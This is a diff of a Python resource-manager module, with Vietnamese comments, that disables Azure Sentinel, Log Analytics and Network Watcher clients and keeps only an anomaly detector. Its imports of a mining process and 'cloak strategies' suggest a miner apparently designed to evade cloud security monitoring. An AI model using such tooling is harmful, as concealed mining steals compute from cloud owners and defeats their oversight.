@@ -23,12 +23,16 @@ from .utils import MiningProcess
 from .cloak_strategies import CloakStrategyFactory
 from .resource_control import ResourceControlFactory
 
-from .azure_clients import (
-    AzureSentinelClient,
-    AzureLogAnalyticsClient,
-    AzureNetworkWatcherClient,
-    AzureAnomalyDetectorClient
-)
+# from .azure_clients import (
+#     AzureSentinelClient,
+#     AzureLogAnalyticsClient,
+#     AzureNetworkWatcherClient,
+#     AzureAnomalyDetectorClient
+# )
+
+# Ở đây, ta sẽ tạm thời bỏ qua các Azure Clients, chỉ giữ lại AzureAnomalyDetectorClient
+from .azure_clients import AzureAnomalyDetectorClient
+
 
 from .auxiliary_modules.interfaces import IResourceManager
 from .auxiliary_modules.models import ConfigModel
@@ -446,28 +450,28 @@ class ResourceManager(IResourceManager):
         Khởi tạo các Azure Client phục vụ giám sát, logging, anomaly.
         """
         self.logger.debug("ResourceManager.initialize_azure_clients: Bắt đầu tạo Azure Clients.")
-        self.azure_sentinel_client = AzureSentinelClient(self.logger)
-        self.azure_log_analytics_client = AzureLogAnalyticsClient(self.logger)
-        self.azure_network_watcher_client = AzureNetworkWatcherClient(self.logger)
+        # self.azure_sentinel_client = AzureSentinelClient(self.logger)
+        # self.azure_log_analytics_client = AzureLogAnalyticsClient(self.logger)
+        # self.azure_network_watcher_client = AzureNetworkWatcherClient(self.logger)
         self.azure_anomaly_detector_client = AzureAnomalyDetectorClient(self.logger, self.config.to_dict())
         self.logger.debug("ResourceManager.initialize_azure_clients: Tạo Azure Clients thành công.")
 
-    def discover_azure_resources(self):
-        """
-        Khám phá các tài nguyên Azure như Network Watchers, NSGs, v.v.
-        """
-        try:
-            net_watchers = self.azure_network_watcher_client.discover_resources('Microsoft.Network/networkWatchers')
-            self.network_watchers = net_watchers
-            self.logger.info(f"Khám phá {len(net_watchers)} Network Watchers.")
+    # def discover_azure_resources(self):
+    #     """
+    #     Khám phá các tài nguyên Azure như Network Watchers, NSGs, v.v.
+    #     """
+    #     try:
+    #         net_watchers = self.azure_network_watcher_client.discover_resources('Microsoft.Network/networkWatchers')
+    #         self.network_watchers = net_watchers
+    #         self.logger.info(f"Khám phá {len(net_watchers)} Network Watchers.")
 
-            nsgs = self.azure_network_watcher_client.discover_resources('Microsoft.Network/networkSecurityGroups')
-            self.nsgs = nsgs
-            self.logger.info(f"Khám phá {len(nsgs)} NSGs.")
+    #         nsgs = self.azure_network_watcher_client.discover_resources('Microsoft.Network/networkSecurityGroups')
+    #         self.nsgs = nsgs
+    #         self.logger.info(f"Khám phá {len(nsgs)} NSGs.")
 
-            self.logger.info("Khám phá Traffic Analytics Workspaces (nếu có).")
-        except Exception as e:
-            self.logger.error(f"Lỗi khám phá Azure: {e}\n{traceback.format_exc()}")
+    #         self.logger.info("Khám phá Traffic Analytics Workspaces (nếu có).")
+    #     except Exception as e:
+    #         self.logger.error(f"Lỗi khám phá Azure: {e}\n{traceback.format_exc()}")
 
     def is_gpu_initialized(self) -> bool:
         """
